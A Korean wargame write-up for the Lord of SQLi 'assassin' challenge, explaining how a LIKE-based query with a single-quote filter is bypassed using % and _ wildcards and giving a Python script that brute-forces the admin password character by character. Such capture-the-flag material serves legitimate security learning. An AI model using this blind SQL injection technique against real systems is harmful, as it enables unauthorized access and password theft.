<img width="209" alt="스크린샷 2020-01-19 오후 8 01 15" src="https://user-images.githubusercontent.com/54495632/72680069-f54d3680-3af8-11ea-80fb-73db4c36b3c0.png">



15번 assassin



<img width="589" alt="스크린샷 2020-01-19 오후 8 03 13" src="https://user-images.githubusercontent.com/54495632/72680074-00a06200-3af9-11ea-91dc-67255cac15af.png">



if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
$query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 

preg_match로 작은 따옴표가 필터링되고
쿼리문 자체에 like가 들어가 있다.

like가 주어져 있어서 %를 통해 우회하기로 했다.
%는 0개 이상의 모든 글자를 대체할 수 있다.



<img width="640" alt="스크린샷 2020-01-19 오후 8 12 59" src="https://user-images.githubusercontent.com/54495632/72680126-a522a400-3af9-11ea-8a34-c334a63826b2.png">
<img width="644" alt="스크린샷 2020-01-19 오후 8 13 13" src="https://user-images.githubusercontent.com/54495632/72680128-a653d100-3af9-11ea-9f14-f5a6b3be4c83.png">
<img width="644" alt="스크린샷 2020-01-19 오후 8 13 49" src="https://user-images.githubusercontent.com/54495632/72680129-a81d9480-3af9-11ea-9cc9-92dbcdf55d92.png">
<img width="643" alt="스크린샷 2020-01-19 오후 8 13 58" src="https://user-images.githubusercontent.com/54495632/72680424-f718f900-3afc-11ea-84f8-34d3d4c9b5b2.png">



다음과 같이 %와 여러 번 숫자를 대입하여 admin의 pw를 찾는 방법으로 문제를 해결할 수 있다.

_ 는 한글자를 대체할 수 있는데 다음과 같이 Pw의 길이를 유추할 수 있다.



<img width="638" alt="스크린샷 2020-01-19 오후 8 12 49" src="https://user-images.githubusercontent.com/54495632/72680171-545f7b00-3afa-11ea-8425-54cbf3c4d3f0.png">

_ 가 8 개 필요하다. pw - lenghth =8

import requests

cookies={'PHPSESSID':'쿠키값'}
url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?"

pw=""
for i in range(1,9):
    for j in range(48,128):
        query="pw="+pw+chr(j)+"%"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Hello admin")>0 or (res.text).find("Hello guest")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)

다음과 같은 파이썬 코드를 이용해 pw를 얻을 수 있다.



<img width="295" alt="스크린샷 2020-01-19 오후 8 43 27" src="https://user-images.githubusercontent.com/54495632/72680382-8d98ea80-3afc-11ea-9906-6363d5ae21d5.png">

<img width="647" alt="스크린샷 2020-01-19 오후 8 43 48" src="https://user-images.githubusercontent.com/54495632/72680384-8f62ae00-3afc-11ea-8bef-425fb59d83d8.png">